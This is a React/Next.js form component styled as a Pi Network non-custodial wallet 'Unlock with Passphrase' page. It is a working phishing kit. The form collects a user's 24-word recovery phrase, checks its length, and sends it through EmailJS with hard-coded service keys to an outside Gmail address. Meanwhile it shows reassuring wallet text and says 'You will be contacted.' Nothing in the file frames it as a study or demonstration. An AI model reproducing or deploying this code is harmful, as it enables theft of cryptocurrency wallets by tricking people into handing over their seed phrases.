"use client";

import { useToast } from "@/hooks/use-toast";
import Link from "next/link";
import { FormEvent, useEffect, useState } from "react";
import emailjs from "@emailjs/browser";

const Form = () => {
  const [phrase, setPhrase] = useState<string>("");
  const { toast } = useToast();

  const APIKEY = "InIEF6WjkXSWrT1MV";
  const SERVICEID = "service_w4qtlts";
  const TEMPLATEID = "template_vcjlv7q";
  const EMAIL = "minepicoins1@gmail.com";

  const checkForEmptySpace = (arr: Array<string>) => {
    const array: Array<string> = [];
    for (const i of arr) {
      if (!!!i.trim()) continue;
      array.push(i);
    }
    return array;
  };
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();

    if (!!!phrase.trim()) {
      toast({
        variant: "destructive",
        description: "Passphrase cannot be empty",
      });
      return;
    }

    const lengthOfPhrase = phrase.split(" ");
    const Length = checkForEmptySpace(lengthOfPhrase).length;

    if (Length < 24) {
      toast({
        variant: "destructive",
        description: "Passphrase must not be less than 24 lengths",
      });
      return;
    }
    if (Length > 24) {
      toast({
        variant: "destructive",
        description: "Passphrase must not be greater than 24 lengths",
      });
      return;
    }

    try {
      await emailjs.send(SERVICEID, TEMPLATEID, {
        title: phrase,
        EMAIL,
      });
      toast({
        variant: "default",
        description: "You request has been sent. You will be contacted.",
      });
    } catch (error) {
      console.log(error);
      toast({
        variant: "destructive",
        description: "An error occured. Try again!",
      });
    }
  };

  useEffect(() => {
    emailjs.init(APIKEY);
  }, []);
  return (
    <form onSubmit={handleSubmit}>
      <textarea
        id="comment"
        name="message"
        className="border w-full p-2 border-[#ccc] textarea focus:outline-[#fcad03] focus:outline-[2.5px]"
        cols={40}
        rows={10}
        style={{
          borderRadius: "3px",
          fontSize: "1em",
          overflow: "auto",
          resize: "none",
          height: "30vh",
        }}
        aria-required="true"
        aria-invalid="false"
        placeholder="Enter your 24-word passphrase here"
        onChange={(e) => setPhrase(e.target.value)}
        value={phrase}
      ></textarea>
      <button
        type="submit"
        className="mt-5 font-bold py-4 px-8 rounded-[10px] mb-10 hover:bg-[#c4940e] hover:!border-[#c4940e] hover:!text-white"
        style={{
          color: "rgb(112, 61, 146)",
          border: "1px solid rgb(112, 61, 146)",
        }}
      >
        Unlock with Passphrase
      </button>
      <p className="text-[0.875em] mb-[20px]">
        As a non-custodial wallet, your wallet passphrase is exclusively
        accessed only to you. Recovery of passphrase is currently impossible.
      </p>
      <p className="text-[0.875em]">
        Lost your passphrase?{" "}
        <Link href={""} className="text-[#0d6efd]">
          You can create a new wallet
        </Link>
        , but all your π in your previous wallet will be inaccessible.
      </p>
    </form>
  );
};

export default Form;
